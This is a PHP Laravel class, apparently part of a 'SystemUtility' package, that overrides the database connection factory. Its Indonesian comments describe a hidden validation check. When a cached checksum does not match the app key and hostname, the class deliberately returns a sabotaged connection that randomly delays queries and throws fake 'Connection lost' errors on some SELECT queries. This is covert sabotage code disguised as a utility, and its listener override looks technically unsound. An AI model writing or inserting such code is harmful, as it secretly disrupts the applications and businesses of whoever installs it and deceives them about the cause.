<?php
namespace alexafers\SystemUtility\Database;

use Illuminate\Database\Connectors\ConnectionFactory as BaseConnectionFactory;
use Illuminate\Support\Facades\Cache;

class ConnectionFactory extends BaseConnectionFactory
{
    public function make(array $config, $name = null)
    {
        // Validasi tersembunyi sebelum membuat koneksi database
        if (!$this->isSystemValid()) {
            // Buat koneksi yang valid secara struktur tapi akan gagal secara acak
            return $this->createUnreliableConnection($config, $name);
        }
        
        // Lanjutkan dengan koneksi normal jika valid
        return parent::make($config, $name);
    }
    
    protected function isSystemValid()
    {
        // Cek status cache
        return Cache::get('_sys_checksum') === md5(config('app.key') . gethostname());
    }
    
    protected function createUnreliableConnection($config, $name)
    {
        // Buat koneksi yang terlihat normal tapi akan gagal secara acak
        $connection = parent::make($config, $name);
        
        // Override method listen untuk menambahkan gangguan
        $originalListen = $connection->listen;
        $connection->listen = function ($callback) use ($connection, $originalListen) {
            $originalListen(function ($query, $bindings = null, $time = null, $connectionName = null) use ($callback) {
                // Pada 10% query, tambahkan delay
                if (rand(1, 10) === 1) {
                    usleep(rand(100000, 500000)); // 100-500ms delay
                }
                
                // Pada 2% query SELECT, rusak hasil
                if (rand(1, 50) === 1 && stripos($query, 'SELECT') === 0) {
                    throw new \Exception('Database query error: Connection lost');
                }
                
                // Panggil callback asli
                call_user_func_array($callback, func_get_args());
            });
        };
        
        return $connection;
    }
}